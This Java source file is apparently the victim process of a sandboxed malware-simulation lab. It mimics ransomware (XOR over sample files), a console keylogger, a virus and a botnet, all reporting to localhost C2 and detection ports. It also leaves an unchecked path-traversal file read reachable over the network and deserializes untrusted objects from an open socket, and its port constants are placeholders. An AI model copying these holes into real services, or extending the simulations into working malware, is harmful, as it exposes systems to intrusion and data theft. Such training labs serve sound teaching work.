// Victim.java
// Safe sandboxed victim process — enhanced ransomware/keylogger/botnet behavior.
// All file operations are restricted to safe_sandbox directory.

import java.net.*;
import java.io.*;
import java.util.*;
import javax.swing.*;
import java.util.Timer;
import java.util.TimerTask;
import java.nio.file.*;
import java.security.MessageDigest;
import java.util.stream.Stream;
import java.awt.Color;

public class Victim {
    private static final int PAYLOAD_PORT = PORT;   // attacker -> victim (Payload objects)
    private static final int C2_PORT = PORT;        // victim -> c2 (text lines)
    private static final int DETECT_PORT = PORT;    // victim -> detection (text lines)
    private static final int CONTROL_PORT = PORT;   // detection -> victim control (BLOCK)
    private static final int CMD_PORT = PORTGGGGG;       // attacker -> victim whitelisted shell

    private volatile boolean blocked = false;
    private final Path SANDBOX = Paths.get("safe_sandbox").toAbsolutePath().normalize();
    private final String id = "victim-1";

    public static void main(String[] args) throws Exception {
        new Victim().startAll();
    }

    public void startAll() throws Exception {
        Files.createDirectories(SANDBOX);
        ensureSamples();
        System.out.println("[VICTIM] sandbox path: " + SANDBOX.toString());

        // start control listener (for Block)
        new Thread(this::controlListener).start();
        // start whitelisted command server
        new Thread(this::cmdServer).start();
        // start payload listener
        try (ServerSocket ss = new ServerSocket(PAYLOAD_PORT)) {
            System.out.println("[VICTIM] listening for payloads on port " + PAYLOAD_PORT);
            while (true) {
                Socket s = ss.accept();
                new Thread(() -> handlePayloadConnection(s)).start();
            }
        }
    }

    private void controlListener() {
        try (ServerSocket ss = new ServerSocket(CONTROL_PORT)) {
            System.out.println("[VICTIM] control port " + CONTROL_PORT + " open (allows detection to send BLOCK)");
            while (true) {
                Socket s = ss.accept();
                try (BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()))) {
                    String l = br.readLine();
                    if ("BLOCK".equalsIgnoreCase(l)) {
                        blocked = true;
                        System.out.println("[VICTIM] Received BLOCK command from Detection. Blocking further actions.");
                        sendDetect("Victim blocked by detection", "HIGH");
                    }
                } catch (IOException e) { }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void cmdServer() {
        // whitelisted commands: ls, read <file>, write <file> <text>, whoami, exit, simulate <name>
        try (ServerSocket ss = new ServerSocket(CMD_PORT)) {
            System.out.println("[VICTIM] cmd server listening on " + CMD_PORT + " (whitelisted commands only)");
            while (true) {
                Socket s = ss.accept();
                new Thread(() -> {
                    try (BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
                         PrintWriter pw = new PrintWriter(s.getOutputStream(), true)) {
                        pw.println("SIM-SHELL: allowed: ls, read <file>, write <file> <text>, whoami, simulate <name>, exit");
                        String line;
                        while ((line = br.readLine()) != null) {
                            line = line.trim();
                            if ("exit".equalsIgnoreCase(line)) { pw.println("bye"); break; }
                            pw.println(handleCmd(line));
                        }
                    } catch (IOException e) { }
                }).start();
            }
        } catch (IOException e) { e.printStackTrace(); }
    }

    private String handleCmd(String line) {
    try {
        String[] parts = line.split(" ", 3);
        String cmd = parts[0].toLowerCase();

        switch (cmd) {
            case "ls":
                if (parts.length >= 2 && "project".equalsIgnoreCase(parts[1])) {
                    return listProjectFiles();
                }
                return String.join(", ", listSandboxFiles());

            case "read":
                if (parts.length < 2) return "usage: read <file>";
                if (parts[1].startsWith("project:")) {
                    return safeReadProject(parts[1].substring(8));
                }
                return safeRead(parts[1]);

            case "write":
                if (parts.length < 3) return "usage: write <file> <text>";
                return safeWrite(parts[1], parts[2]) ? "wrote" : "failed";

            case "whoami":
                return id;

            case "simulate":
                if (parts.length < 2) return "usage: simulate <name>";
                return simulateCanned(parts[1]);

            default:
                return "command not allowed";
        }
    } catch (Exception e) {
        return "error: " + e.getMessage();
    }
}


    private String simulateCanned(String name) {
        switch (name.toLowerCase()) {
            case "netinfo": return "eth0: 192.168.1.50 (sim)";
            case "ps": return "proc1 (sim)\nproc2 (sim)\nproc3 (sim)";
            case "env": return "PATH=/usr/bin (sim)\nHOME=/home/sim";
            default: return "no simulation for: " + name;
        }
    }

    private void handlePayloadConnection(Socket s) {
        try (ObjectInputStream ois = new ObjectInputStream(s.getInputStream())) {
            Object o = ois.readObject();
            if (!(o instanceof Payload)) { System.out.println("[VICTIM] unknown object"); return; }
            Payload p = (Payload) o;
            System.out.println("[VICTIM] received payload: " + p);
            simulatePayload(p);
        } catch (Exception e) { e.printStackTrace(); }
    }

    private void simulatePayload(Payload p) {
    if (blocked) {
        sendDetect("Execution blocked before start: " + p.type, "HIGH");
        return;
    }
    switch (p.type.toUpperCase()) {
        case "VIRUS": runVirus(p); break;
        case "RANSOMWARE": runRansomware(p); break;
        case "KEYLOGGER": runKeyloggerPerChar(p); break;
        case "BOTNET": runBotnet(p); break;
        default: sendC2("Unknown payload: " + p.type);
    }
}


    // -----------------------
    //  safe file operations
    // -----------------------
    private String safeRead(String filename) {
        try {
            Path file = SANDBOX.resolve(filename).normalize();
            if (!file.startsWith(SANDBOX) || !Files.exists(file)) return "File not found";
            return Files.readString(file);
        } catch (Exception e) {
            return "Read failed: " + e.getMessage();
        }
    }

    private boolean safeWrite(String filename, String data) {
        try {
            Path file = SANDBOX.resolve(filename).normalize();
            if (!file.startsWith(SANDBOX)) return false;
            Files.writeString(file, data, StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    // -----------------------
    // Payload simulations
    // -----------------------
    private void runVirus(Payload p) {
        List<String> files = listSandboxFiles();
        if (files.isEmpty()) {
            sendC2("VIRUS: nothing to delete");
            sendDetect("VIRUS: none", "LOW");
            return;
        }
        for (String f : files) {
            if (blocked) { sendC2("VIRUS stopped by detection"); return; }
            boolean ok = moveToInfected(f); // updated: move to infected/ rather than permanent delete
            sendC2("VIRUS deleted: " + f + " ok=" + ok);
            sendDetect("VIRUS deleted: " + f, "HIGH");
            sleep(500);
        }
        sendC2("VIRUS finished");
    }

    private void runRansomware(Payload p) {
        List<String> files = listSandboxFiles();
        if (files.isEmpty()) {
            sendC2("RANSOMWARE: nothing to encrypt");
            sendDetect("RANSOMWARE: none", "LOW");
            return;
        }

        String overallHash = "";
        for (String f : files) {
            if (blocked) { sendC2("RANSOMWARE stopped by detection"); return; }
            try {
                String hash = xorEncryptFileAndReturnHexHash(f, (byte)0x5A);
                sendC2("RANSOMWARE encrypted: " + f + " sha256=" + hash);
                sendDetect("RANSOMWARE encrypted: " + f, "HIGH");
                overallHash = hash; // last file's hash (for demo)
            } catch (Exception e) {
                sendC2("RANSOMWARE failed encrypt: " + f);
                sendDetect("RANSOMWARE failed:" + f, "HIGH");
            }
            sleep(600);
        }

        // show ransom note with last-file hash
        final String displayHash = overallHash.isEmpty() ? "N/A" : overallHash;
        showRansomNoteWithHash(displayHash);
    }

    // XOR-encrypt the file bytes in-place (sandbox only) and return SHA-256 hex of encrypted bytes
    private String xorEncryptFileAndReturnHexHash(String fname, byte key) throws Exception {
        Path p = SANDBOX.resolve(fname).normalize();
        if (!p.startsWith(SANDBOX) || !Files.exists(p)) throw new FileNotFoundException(fname);
        byte[] data = Files.readAllBytes(p);
        for (int i = 0; i < data.length; i++) data[i] = (byte)(data[i] ^ key);
        Files.write(p, data, StandardOpenOption.TRUNCATE_EXISTING);
        // compute sha-256
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        byte[] digest = md.digest(data);
        return bytesToHex(digest);
    }

    private String bytesToHex(byte[] b) {
        StringBuilder sb = new StringBuilder();
        for (byte x : b) sb.append(String.format("%02x", x & 0xFF));
        return sb.toString();
    }

   
    // KEYLOGGER: capture input char-by-char from Victim terminal and forward each char to C2 (safe)
    private void runKeyloggerPerChar(Payload p) {
        sendC2("KEYLOGGER: started (per-character). Type in victim console. ENDKL to stop line; type ENDKL_LINE to stop per-char mode.");
        sendDetect("KEYLOGGER started", "MEDIUM");
        try {
            InputStream in = System.in;
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            while (true) {
                int ch = in.read(); // blocking, reads raw byte/char
                if (ch == -1) break;
                char c = (char) ch;
                // build lines for ENDKL detection
                buffer.write(ch);
                String cur = buffer.toString();
                // if user typed newline, check buffer for ENDKL_LINE sentinel
                if (c == '\n' || c == '\r') {
                    String line = cur.trim();
                    buffer.reset();
                    if ("ENDKL".equals(line)) {
                        sendC2("KEYLOGGER: stopped line mode");
                        break;
                    }
                    if ("ENDKL_LINE".equals(line)) {
                        sendC2("KEYLOGGER: stopped per-char mode");
                        break;
                    }
                }
                // send each visible char (and newlines) to C2 and detection
                sendC2("KEYLOGGER char: [" + printableChar(c) + "]");
                sendDetect("KEYLOGGER char captured", "MEDIUM");
                if (blocked) { sendC2("KEYLOGGER blocked"); break; }
            }
        } catch (IOException e) {
            sendC2("KEYLOGGER error: " + e.getMessage());
        }
    }

    private String printableChar(char c) {
        if (c == '\n' || c == '\r') return "\\n";
        if (Character.isISOControl(c)) return String.format("0x%02x", (int)c);
        return Character.toString(c);
    }

    private void runBotnet(Payload p) {
        sendC2("BOTNET: starting tasks");
        sendDetect("BOTNET started", "HIGH");
        Timer t = new Timer();
        TimerTask task = new TimerTask() {
            int c = 0;
            public void run() {
                if (blocked) { sendC2("BOTNET stopped by detection"); t.cancel(); return; }
                c++;
                String msg = "BOTNET task #" + c + " from " + id;
                sendC2(msg);
                sendDetect("BOTNET task executed", "HIGH");
                // also show a local popup on victim to illustrate heavy load (optional)
                SwingUtilities.invokeLater(() -> {
                    JFrame f = new JFrame("BOTNET TASK");
                    f.setSize(360, 80);
                    f.setAlwaysOnTop(true);
                    f.setLocationRelativeTo(null);
                    JLabel l = new JLabel("Botnet task executed #" + c, SwingConstants.CENTER);
                    f.add(l);
                    f.setVisible(true);
                    new Timer().schedule(new TimerTask(){ public void run(){ f.dispose(); } }, 900);
                });
                if (c >= 10) { sendC2("BOTNET finished"); t.cancel(); }
            }
        };
        t.scheduleAtFixedRate(task, 0, 1500);
    }

    // -----------------------
    // Helpers
    // -----------------------
    private List<String> listSandboxFiles() {
        try (Stream<Path> s = Files.list(SANDBOX)) {
            List<String> out = new ArrayList<>();
            s.filter(Files::isRegularFile).forEach(p -> out.add(p.getFileName().toString()));
            return out;
        } catch (IOException e) { return Collections.emptyList(); }
    }

    // move to infected/ directory for visibility (instead of permanent deletion)
    private boolean moveToInfected(String fname) {
        try {
            Path file = SANDBOX.resolve(fname).normalize();
            if (!file.startsWith(SANDBOX) || !Files.exists(file)) return false;
            Path infectedDir = SANDBOX.resolve("infected");
            if (!Files.exists(infectedDir)) Files.createDirectories(infectedDir);
            Path target = infectedDir.resolve(file.getFileName());
            Files.move(file, target, StandardCopyOption.REPLACE_EXISTING);
            System.out.println("[VIRUS] moved " + fname + " to infected/");
            return true;
        } catch (IOException e) { return false; }
    }

    private boolean safeDelete(String fname) {
        // kept for compatibility; not used when moving to infected/
        try {
            Path p = SANDBOX.resolve(fname).normalize();
            if (!p.startsWith(SANDBOX)) return false;
            return Files.deleteIfExists(p);
        } catch (IOException e) { return false; }
    }

    private boolean overwriteEncrypted(String fname) {
        try {
            Path p = SANDBOX.resolve(fname).normalize();
            if (!p.startsWith(SANDBOX) || !Files.exists(p)) return false;
            Files.write(p, ("<<ENCRYPTED SIMULATION>>\n").getBytes(), StandardOpenOption.TRUNCATE_EXISTING);
            return true;
        } catch (IOException e) { return false; }
    }

    private void ensureSamples() {
        try {
            for (int i = 1; i <= 5; i++) {
                Path p = SANDBOX.resolve("sample_" + i + ".txt");
                if (!Files.exists(p)) Files.writeString(p, "SAMPLE " + i + " -- confidential (SIM)");
            }
        } catch (IOException e) { e.printStackTrace(); }
    }

    private void showRansomNoteWithHash(String hash) {
        SwingUtilities.invokeLater(() -> {
            JFrame f = new JFrame();
            f.setUndecorated(true);
            f.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
            f.setExtendedState(JFrame.MAXIMIZED_BOTH);
            String html = "<html><center><div style='color:red; font-size:42px;'>YOUR FILES ARE ENCRYPTED (SIMULATION)</div>"
                        + "<div style='margin-top:20px; font-size:20px; color:white;'>SHA-256 of last encrypted file: <br><b>" + hash + "</b></div>"
                        + "<div style='margin-top:30px; font-size:20px; color:yellow;'>Pay ransom to: 1BoatExampleBTC (simulation)</div>"
                        + "<div style='margin-top:30px; font-size:16px; color:lightgray;'>Close this window to continue (simulation)</div>"
                        + "</center></html>";
            JLabel l = new JLabel(html, SwingConstants.CENTER);
            l.setOpaque(true);
            l.setBackground(Color.BLACK);
            f.add(l);
            f.setVisible(true);
        });
    }

    // -----------------------
    // Network helpers
    // -----------------------
    private void sendC2(String text) {
        Net.sendLine("localhost", C2_PORT, "[" + id + "] " + text);
    }

    private void sendDetect(String text, String severity) {
        Net.sendLine("localhost", DETECT_PORT, "[" + id + "] " + text + " | " + severity);
    }

    private void sleep(int ms) { try { Thread.sleep(ms); } catch (InterruptedException e) { } }
    // -----------------------
// Project dir read-only helpers
// -----------------------
private String listProjectFiles() {
    try (Stream<Path> s = Files.list(Paths.get(".").toAbsolutePath().normalize())) {
        List<String> out = new ArrayList<>();
        s.filter(Files::isRegularFile).forEach(p -> out.add(p.getFileName().toString()));
        return String.join(", ", out);
    } catch (IOException e) {
        return "list failed: " + e.getMessage();
    }
}

private String safeReadProject(String filename) {
    try {
        Path file = Paths.get(".").toAbsolutePath().normalize().resolve(filename);
        if (!Files.exists(file)) return "File not found in project dir";
        return Files.readString(file);
    } catch (Exception e) {
        return "read failed: " + e.getMessage();
    }
}

    
}
